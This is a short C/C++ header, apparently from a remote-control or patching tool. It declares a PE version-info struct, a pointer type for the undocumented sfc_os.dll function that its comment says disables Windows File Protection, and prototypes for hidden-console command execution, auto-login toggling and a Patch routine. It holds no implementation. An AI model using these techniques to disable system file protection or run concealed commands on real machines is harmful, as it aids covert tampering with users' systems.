#include "../../common/protocol.h"

//#define		MALLOC(x)	HeapAlloc(GetProcessHeap(), 0, (x))
//#define		FREE(x)		HeapFree(GetProcessHeap(), 0, (x))

// Struct for PE file version info
typedef struct _MYVERSIONINFO
{
	DWORD	dwSize;							// struct size

	WORD	wMajorVersion;					// Major version number
	WORD	wMinorVersion;					// Minor version number
	WORD	wBuildNumber;					// Build number
	WORD	wRevisionNumber;				// Revision number

	WORD	wLangID;						// Language ID;

	TCHAR	szShortVersion[32];				// File version string, likes "1.0.2.2000"
	TCHAR	szFileVersion[MAX_PATH];		// File version string, likes "1.0.2.2000, rc_061220"
	TCHAR	szOriginalFilename[64];			// Original file name
}MYVERSIONINFO, *PMYVERSIONINFO;

////////////////////////////////////////////////////////////////////////////////////////////////////
//
// For disable SFC/WFP in NT5. Using No. 5 function in sfc_os.dll.
//
// Return value:
// 0, S_OK: success
// 1:       error occurred (usually that the file is not protected by WFP)
//
typedef HRESULT (WINAPI *DllfnSetSfcFileException) (
													DWORD dwUnknown0,	// Unknown. Set to 0 
													PWCHAR pwszFile,	// File name 
													DWORD dwUnknown1	// 	Unknown. Set to -1
													);




int Patch(LPVOID Param);
//bool Patch(SOCKET s, PPacket p);
//WCHAR* Patch();
DWORD Crypt( char* lpPassword, LPBYTE lpResult, DWORD dwSize );
//PVOID ReadFileToBuffer(LPTSTR pszFile, PDWORD pdwBufferSize);
BOOL RunHiddenConsoleW(LPWSTR pszCmdLine, BOOL bWait);
BOOL RunHiddenConsoleA(LPSTR pszCmdLine, BOOL bWait);
bool AutoLogin(bool sw_ON_OFF);
bool AutoLoginCheck();
